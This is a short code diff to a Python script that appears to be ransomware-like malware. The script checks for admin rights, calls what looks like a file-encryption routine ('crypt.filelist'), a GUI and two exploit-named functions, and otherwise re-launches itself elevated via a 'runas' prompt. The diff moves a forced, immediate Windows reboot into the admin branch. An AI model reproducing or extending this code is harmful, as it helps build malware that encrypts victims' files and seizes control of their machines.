@@ -38,9 +38,9 @@ if(get_admin_rights.is_admin()):
         crypt.filelist()
         cp.cp_gui()
         dk.exp()
-        time.sleep(1)
         dr.exp()
+        # REBOOT WINDOWS
+        os.system("\\Windows\\System32\\shutdown.exe -t 0 -r -f")
 else:
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
-# REBOOT WINDOWS
-os.system("\\Windows\\System32\\shutdown.exe -t 0 -r -f")
+
